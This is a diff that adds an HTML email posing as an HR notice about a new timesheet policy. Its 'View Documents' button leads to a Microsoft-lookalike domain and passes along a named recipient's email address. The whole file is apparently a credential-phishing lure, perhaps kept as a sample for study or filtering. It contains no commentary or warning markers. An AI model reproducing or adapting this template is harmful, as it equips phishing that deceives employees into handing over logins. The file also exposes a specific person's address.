@@ -1,0 +1,70 @@
+<html lang="en" dir="ltr">
+	<head>
+		<meta charset="utf-8">
+		<title></title>
+	</head>
+	<body>
+		<div role="document" tabindex="-1" aria-label="Message body" class="XbIp4 jmmB7 GNqVo yxtKT allowTextSelection OuGoX" id="UniqueMessageBody">
+			<div>
+				<style type="text/css">
+					<!--
+						-->
+				</style>
+				<div class="rps_8b0a">
+					<div>
+            <table role="presentation" style="width:100%;border:none;border-spacing:0">
+            	<tbody>
+            		<tr>
+            			<td align="center" style="padding:0">
+            			<table role="presentation" style="width:94%;max-width:600px;border:none;border-spacing:0;text-align:left;font-family:Arial,sans-serif;font-size:16px;line-height:22px;color:#000000">
+            				<tbody>
+            					<tr>
+            						<td style="padding:30px;color:#000000;background-color:#ffffff;border-radius:4px">
+            						<h1 style="line-height:1.2;margin-bottom:30px;color:#102e59">New Documents for You</h1>
+
+            						<p>Hello,</p>
+
+            						<p>Please take a few minutes to review the following new documents that we've posted for you:</p>
+
+            						<ul>
+            							<li>New Timesheet Policy.docx</li>
+            						</ul>
+
+            						<table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation" width="100%" style="margin:30px 0">
+            							<tbody align="center">
+            								<tr>
+            									<td align="center">
+            									<table align="center" border="0" cellpadding="0" cellspacing="0">
+            										<tbody>
+            											<tr>
+            												<td align="center" bgcolor="#102e59" style="padding:12px 18px;border-radius:0px"> <a href="https://micro.softverify01e.com?email=jknoefel@erols.com"> <span style="font-size:16px;font-family:Helvetica,Arial,sans-serif;font-weight:normal;color:#ffffff;text-decoration:none;display:inline-block">View Documents </span> </a> </td>
+            											</tr>
+            										</tbody>
+            									</table>
+            									</td>
+            								</tr>
+            							</tbody>
+            						</table>
+
+            						<p>Thank you,<br>
+            						<span class="il">HR</span></p>
+            						</td>
+            					</tr>
+            					<tr>
+            						<td style="padding:30px;font-size:12px;line-height:0.75;text-align:center">
+            						<p>Please do not reply to this email.</p>
+
+            						</td>
+            					</tr>
+            				</tbody>
+            			</table>
+            			</td>
+            		</tr>
+            	</tbody>
+            </table>
+					</div>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
